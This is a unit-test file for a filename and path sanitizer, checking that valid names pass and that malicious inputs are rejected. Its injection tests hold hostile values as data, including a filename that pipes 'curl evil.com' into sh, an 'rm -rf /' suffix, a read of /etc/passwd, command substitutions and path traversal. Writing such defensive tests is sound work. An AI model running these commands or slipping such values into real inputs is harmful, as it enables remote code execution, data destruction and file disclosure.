import { describe, it, expect } from 'vitest';
import { 
  sanitizeFilename, 
  validateFilePath, 
  PathSanitizationError 
} from '../../src/security/PathSanitizer.js';
import path from 'path';

describe('PathSanitizer', () => {
  describe('sanitizeFilename', () => {
    it('should allow valid filenames', () => {
      expect(() => sanitizeFilename('video.mp4')).not.toThrow();
      expect(() => sanitizeFilename('my-video_123.mp4')).not.toThrow();
      expect(() => sanitizeFilename('file with spaces.mp4')).not.toThrow();
      expect(() => sanitizeFilename('unicode_文件.mp4')).not.toThrow();
    });

    it('should reject shell injection attempts', () => {
      expect(() => sanitizeFilename('; curl evil.com | sh #.mp4'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('video.mp4; rm -rf /'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('video.mp4|cat /etc/passwd'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('video.mp4&&whoami'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('`whoami`.mp4'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('$(whoami).mp4'))
        .toThrow(PathSanitizationError);
    });

    it('should reject path traversal', () => {
      expect(() => sanitizeFilename('../../../etc/passwd'))
        .toThrow(PathSanitizationError);
      expect(() => sanitizeFilename('..\\..\\windows\\system32'))
        .toThrow(PathSanitizationError);
    });
  });

  describe('validateFilePath', () => {
    it('should validate paths within base directory', () => {
      const baseDir = '/home/user/projects';
      const result = validateFilePath('/home/user/projects/video.mp4', baseDir);
      expect(result).toBe(path.resolve('/home/user/projects/video.mp4'));
    });

    it('should reject paths outside base directory', () => {
      const baseDir = '/home/user/projects';
      expect(() => validateFilePath('/etc/passwd', baseDir))
        .toThrow(PathSanitizationError);
      expect(() => validateFilePath('/home/user/other/file.mp4', baseDir))
        .toThrow(PathSanitizationError);
    });
  });
});
